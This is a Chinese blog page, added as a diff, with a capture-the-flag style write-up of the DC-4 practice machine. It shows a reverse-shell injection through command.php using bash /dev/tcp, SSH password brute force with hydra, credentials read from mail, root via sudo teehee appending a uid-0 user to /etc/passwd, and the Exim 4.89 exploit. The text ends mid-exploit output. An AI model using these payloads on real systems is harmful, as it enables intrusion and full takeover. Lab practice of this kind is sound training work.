@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="17year" />
+  <meta name="author" content="17year" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DC4靶机记录 
+      
+      
+      |
+    
+     17year&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">17year</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">AboutMe</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DC4靶机记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-09-13 11:11:11
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/WirteUp/" title="WirteUp">
+                    <b>#</b> WirteUp
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DC4-靶机记录"><a href="#DC4-靶机记录" class="headerlink" title="DC4 靶机记录"></a>DC4 靶机记录</h1><h3 id="nmap查看信息"><a href="#nmap查看信息" class="headerlink" title="nmap查看信息"></a>nmap查看信息</h3><p><code>sudo nmap -p- -sS -A -sV -vv ip</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp6/VowbK8MWfMDQsxHRV2yvL8ZO+FEkyIBPnDwTVKkJiVKaJMZ5ztAwTnkc30c3tvC/yCqDAJ5IbHzgvR3kHKS37d17K+/OLxalDutFjrWjG7mBxhMW/0gnrCqJokZBDXDuvHQonajsfSN6FmWoP0PDsfL8NQXwWIoMvTRYHtiEQqczV5CYZZtMKuOyiLCiWINUqKMwY+PTb0M9RzSGYSJvN8sZZnvIw/xU7xBCmaWuq8h2dIfsxy+FhrwZMhvhJOpBYtwZB+hos3bbV5FKHhVztxEo+Y2vyKTl6MXJ4qwCChJdaBAip/aUt1zDoF3cIb+yebteyDk8KIqmp5Ju4r</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIbZ4PXPXShXCcbe25IY3SYbzB4hxP4K2BliUGtuYSABZosGlLlL1Pi214yCLs3ORpGxsRIHv8R0KFQX+5SNSog=</span><br><span class="line">|   256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcvQZ2DbLqSSOzIbIXhyrDJ15duVKd9TEtxfX35ubsM</span><br><span class="line">80/tcp open  http    syn-ack ttl 64 nginx 1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+
+<h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p>index.php为登录页面</p>
+<p>尝试扫描目录没有收获</p>
+<p>尝试爆破口令</p>
+<p>获取到用户名密码 <code>admin happy</code></p>
+<h3 id="发现command-php存在RCE"><a href="#发现command-php存在RCE" class="headerlink" title="发现command.php存在RCE"></a>发现command.php存在RCE</h3><p>为了方便尝试反弹shell</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /command.php HTTP/1.1</span><br><span class="line">Host: 172.16.40.99</span><br><span class="line">Content-Length: 77</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://172.16.40.99</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://172.16.40.99/command.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=e93bqfedkkqs9resg42gcf1473</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">radio=bash+-c+&#x27;exec+bash+-i+%26&gt;/dev/tcp/172.16.40.97/20000+&lt;%261&#x27;&amp;submit=Run</span><br></pre></td></tr></table></figure>
+<h3 id="攻击机端监听端口"><a href="#攻击机端监听端口" class="headerlink" title="攻击机端监听端口"></a>攻击机端监听端口</h3><p><code>nc -lvvp 20000</code></p>
+<h3 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 20000 ...</span><br><span class="line"></span><br><span class="line">172.16.40.99: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [172.16.40.97] from (UNKNOWN) [172.16.40.99] 43194</span><br><span class="line">bash: cannot set terminal process group (453): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@dc-4:/usr/share/nginx/html$ </span><br><span class="line">www-data@dc-4:/usr/share/nginx/html$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;      </span><br><span class="line">&lt;tml$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@dc-4:/usr/share/nginx/html$ ls</span><br><span class="line">ls</span><br><span class="line">command.php  css  images  index.php  login.php	logout.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/usr/share/nginx/html$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<h3 id="使用ls查看当前目录信息"><a href="#使用ls查看当前目录信息" class="headerlink" title="使用ls查看当前目录信息"></a>使用ls查看当前目录信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/usr/share/nginx/html$ ls</span><br><span class="line">command.php  css  images  index.php  login.php	logout.php</span><br></pre></td></tr></table></figure>
+<h3 id="访问passwd文件发现存在多个用户"><a href="#访问passwd文件发现存在多个用户" class="headerlink" title="访问passwd文件发现存在多个用户"></a>访问passwd文件发现存在多个用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/usr/share/nginx/html$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false</span><br><span class="line">charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br></pre></td></tr></table></figure>
+<h3 id="进入home目录发现存在3个用户"><a href="#进入home目录发现存在3个用户" class="headerlink" title="进入home目录发现存在3个用户"></a>进入home目录发现存在3个用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/home$ ls</span><br><span class="line">charles  jim  sam</span><br></pre></td></tr></table></figure>
+<h3 id="分别进入3个用户目录发现仅jim中存在文件"><a href="#分别进入3个用户目录发现仅jim中存在文件" class="headerlink" title="分别进入3个用户目录发现仅jim中存在文件"></a>分别进入3个用户目录发现仅jim中存在文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/home/jim$ ls</span><br><span class="line">backups  mbox  test.sh</span><br></pre></td></tr></table></figure>
+<h3 id="进入backups-发现存在密码备份文件"><a href="#进入backups-发现存在密码备份文件" class="headerlink" title="进入backups 发现存在密码备份文件"></a>进入backups 发现存在密码备份文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/home/jim/backups$ ls</span><br><span class="line">old-passwords.bak</span><br></pre></td></tr></table></figure>
+<h3 id="尝试使用获取到的文件进行ssh爆破"><a href="#尝试使用获取到的文件进行ssh爆破" class="headerlink" title="尝试使用获取到的文件进行ssh爆破"></a>尝试使用获取到的文件进行ssh爆破</h3><p><code>hydra -l jim -P old-passwords.bak ssh://172.16.40.99</code></p>
+<h3 id="成功爆破到密码"><a href="#成功爆破到密码" class="headerlink" title="成功爆破到密码"></a>成功爆破到密码</h3><p><code>[22][ssh] host: 172.16.40.99   login: jim   password: jibril04</code></p>
+<h3 id="使用jim登录到系统"><a href="#使用jim登录到系统" class="headerlink" title="使用jim登录到系统"></a>使用jim登录到系统</h3><p>通过查找找到Charles的密码<code>^xHhA&amp;hvim0y</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cd /var/mail/</span><br><span class="line">jim@dc-4:/var/mail$ ls</span><br><span class="line">jim</span><br><span class="line">jim@dc-4:/var/mail$ cat jim </span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">	id 1hCjIX-0000kO-Qt</span><br><span class="line">	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="登录Charles用户"><a href="#登录Charles用户" class="headerlink" title="登录Charles用户"></a>登录Charles用户</h3><p>使用<code>sudo -l</code>发现teehee拥有root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
+<h3 id="尝试提权1-teehee提权"><a href="#尝试提权1-teehee提权" class="headerlink" title="尝试提权1(teehee提权)"></a>尝试提权1(teehee提权)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">teehee提权</span><br><span class="line">teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</span><br><span class="line"></span><br><span class="line">核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</span><br><span class="line"></span><br><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</span><br></pre></td></tr></table></figure>
+<h3 id="teehee成功提权获得root权限"><a href="#teehee成功提权获得root权限" class="headerlink" title="teehee成功提权获得root权限"></a>teehee成功提权获得root权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ echo &quot;superman01::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">superman01::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ su superman01</span><br><span class="line">bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line">root@dc-4:/home/charles# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="尝试提权2-exim4提权"><a href="#尝试提权2-exim4提权" class="headerlink" title="尝试提权2(exim4提权)"></a>尝试提权2(exim4提权)</h3><p>在jim用户下尝试使用SUID提权发现存在exim4,且版本为4.89</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/var/mail$ find / -user root -perm /4000 2&gt;/dev/null</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/usr/lib/exim4$ ./exim4 --version</span><br><span class="line">Exim version 4.89 #2 built 10-Feb-2018 08:26:05</span><br><span class="line">Copyright (c) University of Cambridge, 1995 - 2017</span><br><span class="line">(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017</span><br><span class="line">Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</span><br><span class="line">Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open</span><br><span class="line">Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</span><br><span class="line">Authenticators: cram_md5 plaintext</span><br><span class="line">Routers: accept dnslookup ipliteral manualroute queryprogram redirect</span><br><span class="line">Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</span><br><span class="line">Fixed never_users: 0</span><br><span class="line">Configure owner: 0:0</span><br><span class="line">Size of off_t: 8</span><br><span class="line">Configuration file is /var/lib/exim4/config.autogenerated</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="使用kali搜索exim-发现存在以下可利用"><a href="#使用kali搜索exim-发现存在以下可利用" class="headerlink" title="使用kali搜索exim,发现存在以下可利用"></a>使用kali搜索exim,发现存在以下可利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">exim</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                            |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Dovecot with Exim - &#x27;sender_address&#x27; Remote Command Execution                                                             | linux/remote/25297.txt</span><br><span class="line">Exim 3.x - Format String                                                                                                  | linux/local/20900.txt</span><br><span class="line">Exim 4.41 - &#x27;dns_build_reverse&#x27; Local Buffer Overflow                                                                     | linux/local/756.c</span><br><span class="line">Exim 4.41 - &#x27;dns_build_reverse&#x27; Local Read Emails                                                                         | linux/local/1009.c</span><br><span class="line">Exim 4.42 - Local Privilege Escalation                                                                                    | linux/local/796.sh</span><br><span class="line">Exim 4.43 - &#x27;auth_spa_server()&#x27; Remote                                                                                    | linux/remote/812.c</span><br><span class="line">Exim4 &lt; 4.69 - string_format Function Heap Buffer Overflow (Metasploit)                                                   | linux/remote/16925.rb</span><br><span class="line">Exim 4.63 - Remote Command Execution                                                                                      | linux/remote/15725.pl</span><br><span class="line">Exim 4.84-3 - Local Privilege Escalation                                                                                  | linux/local/39535.sh</span><br><span class="line">Exim &lt; 4.86.2 - Local Privilege Escalation                                                                                | linux/local/39549.txt</span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation                                                                             | linux/local/46996.sh</span><br><span class="line">Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit)                                                                | linux/local/47307.rb</span><br><span class="line">Exim 4.87 &lt; 4.91 - (Local / Remote) Command Execution                                                                     | linux/remote/46974.txt</span><br><span class="line">Exim 4.89 - &#x27;BDAT&#x27; Denial of Service                                                                                      | multiple/dos/43184.txt</span><br><span class="line">Exim &lt; 4.90.1 - &#x27;base64d&#x27; Remote Code Execution                                                                           | linux/remote/44571.py</span><br><span class="line">exim 4.90 - Remote Code Execution                                                                                         | linux/remote/45671.py</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                             | linux/local/40054.c</span><br><span class="line">Exim Buffer 1.6.2/1.6.51 - Local Overflow                                                                                 | unix/local/20333.c</span><br><span class="line">Exim ESMTP 4.80 - glibc gethostbyname Denial of Service                                                                   | linux/dos/35951.py</span><br><span class="line">Exim - &#x27;GHOST&#x27; glibc gethostbyname Buffer Overflow (Metasploit)                                                           | linux/remote/36421.rb</span><br><span class="line">Exim Internet Mailer 3.35/3.36/4.10 - Format String                                                                       | linux/local/22066.c</span><br><span class="line">Exim - &#x27;perl_startup&#x27; Local Privilege Escalation (Metasploit)                                                             | linux/local/39702.rb</span><br><span class="line">Exim Sender 3.35 - Verification Remote Stack Buffer Overrun                                                               | linux/remote/24093.c</span><br><span class="line">Exim - &#x27;sender_address&#x27; Remote Code Execution                                                                             | linux/remote/25970.py</span><br><span class="line">PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                                                                  | php/webapps/42221.py</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="通过尝试46996-sh可用"><a href="#通过尝试46996-sh可用" class="headerlink" title="通过尝试46996.sh可用"></a>通过尝试46996.sh可用</h3><p>使用scp将payload上传到靶机</p>
+<p><code>scp 46996.sh jim@172.16.40.99:/home/jim</code></p>
+<h3 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权"></a>成功提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ ./46996.sh </span><br><span class="line">/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Preparing setuid shell helper...</span><br><span class="line"></span><br><span class="line">Delivering 